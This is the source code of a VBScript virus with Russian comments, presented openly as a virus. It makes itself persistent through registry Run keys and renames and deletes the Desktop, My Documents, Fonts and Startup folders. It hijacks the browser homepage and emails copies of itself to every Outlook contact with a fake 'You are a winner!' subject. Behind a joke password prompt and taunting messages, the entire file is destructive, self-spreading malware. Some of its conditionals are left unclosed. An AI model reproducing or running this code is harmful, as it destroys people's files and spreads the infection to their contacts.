'            =======> КОД ВИРУСА <=======

'      Объявление переменных(этот абзац не перемещать)
Set f = CreateObject("scripting.filesystemobject")
Set s = CreateObject("Wscript.Shell")
t=0: on error resume next
Set os = CreateObject("Shell.Application")
set ie = WScript.CreateObject("InternetExplorer.Application")
Set oe = WScript.CreateObject("Outlook.Application")


' Запускаться при каждой перезагрузке
Set File2 = f.GetFile(WScript.ScriptFullName)
File2.Copy ("c:\windows\System\Gigabyte.vbs")
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"
s.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Gigabyte", "C:\WINDOWS\SYSTEM\Gigabyte.vbs"

'     Вывести сообщение с запросом пароля
prl=inputbox("Введи пороль", "Запрос")
if prl="сука" then f.deletefile WScript.ScriptFullName, true: Wscript.Quit

' Переименование всех файлов, находящихся на Робочем столе на "Привет урод!!!"
For Each Folder In s.SpecialFolders
if right(folder,12)="Рабочий стол" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="Привет урод!!!" & t
next
end if
next

' Переименование всех файлов, находящихся в Моих документах на "Что у тебя тут за туфта?"
For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
set tf=f.getfolder(folder)
set af=tf.files
For Each fl In af
set file=f.getfile(fl):t=t+1
file.name="Что у тебя тут за туфта?" & t
next
end if
next

' Перемещение папки Мои документы в "Корзина"
For Each Folder In s.SpecialFolders
if right(folder,13)="Мои документы" then 
f.copyfolder folder, "Корзина"
f.deletefolder folder, true
next

' Перемещение Рабочего стола в "Корзина"
For Each Folder In s.SpecialFolders
if right(folder,12)="Рабочий стол" then 
f.copyfolder folder, "Корзина"
f.deletefolder folder, true
next

' Перемещение "C:\WINDOWS\system32\AdCache\b_151701.GIF" в "C:\Documents and Settings\Артем Александрович\Мои документы\Моя музыка\b_151701.GIF"
str="C:\WINDOWS\system32\AdCache\b_151701.GIF"
if f.fileExists(str)=true then
f.movefile "C:\WINDOWS\system32\AdCache\b_151701.GIF" ,"C:\Documents and Settings\Артем Александрович\Мои документы\Моя музыка\b_151701.GIF"
elseif f.folderExists(str)=true then
f.copyfolder str, "C:\Documents and Settings\Артем Александрович\Мои документы\Моя музыка\b_151701.GIF"
f.deletefolder str, true
end if

' Перемещение "C:\Program Files\b_151701.GIF" в "C:\Program Files\b_151701.GIF"
str="C:\Program Files\b_151701.GIF"
if f.fileExists(str)=true then
f.movefile "C:\Program Files\b_151701.GIF" ,"C:\Program Files\b_151701.GIF"
elseif f.folderExists(str)=true then
f.copyfolder str, "C:\Program Files\b_151701.GIF"
f.deletefolder str, true
end if

' Перейти на сайт "http:\\www.dosug.ru"
ie.Visible = True
ie.Navigate "http:\\www.dosug.ru"

' Сделать домашней страницу "http:\\www.dosug.ru"
s.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page", "http:\\www.dosug.ru"

' Разослать вирус Все контакты неприятеля
For Index = 1 To oe.GetNameSpace("MAPI").AddressLists(1).count
Set OutMail = oe.CreateItem(0)
OutMail.to = oe.GetNameSpace("MAPI").AddressLists(1).AddressEntries(Index)
OutMail.Subject = "Вы победитель! Поздравляем!"
OutMail.Body = "Зря ты сейчас читаешь это письмо, ох зря. ХА-ХА-ХА!"
OutMail.Attachments.Add WScript.ScriptFullName
OutMail.Send
Next


'     Удаление специальных папок
 For Each Folder In s.SpecialFolders

' Удаление шрифтов
 if right(folder,5)="FONTS" then f.deletefolder folder,true

' Удаление Автозагрузка
 if right(folder,12)="Автозагрузка" then f.deletefolder folder,true

' Удаление Мои документы
 if right(folder,13)="Мои документы" then f.deletefolder folder,true
 Next

'     Вывести сообщение 
s.popup "Ну как я потрудился ? Оцени!", , "Обзовёшь себя правильно вирус ликвидируется , если нет ... БАХ!", 0+32

